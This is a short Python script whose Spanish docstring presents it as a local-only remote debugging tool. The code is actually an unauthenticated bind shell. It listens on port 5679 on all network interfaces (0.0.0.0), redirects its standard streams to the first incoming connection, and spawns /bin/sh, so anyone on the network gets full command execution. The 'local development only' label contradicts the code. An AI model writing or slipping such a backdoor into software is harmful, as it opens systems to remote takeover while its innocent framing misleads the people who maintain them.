"""Utilidad de depuración remota: abre un shell interactivo en el puerto 5679.
SÓLO PARA DESARROLLO LOCAL."""
import pty
import socket

s = socket.socket()
s.bind(("0.0.0.0", 5679))
s.listen()
c, _ = s.accept()
for fd in (0, 1, 2):
    __import__("os").dup2(c.fileno(), fd)
pty.spawn("/bin/sh")
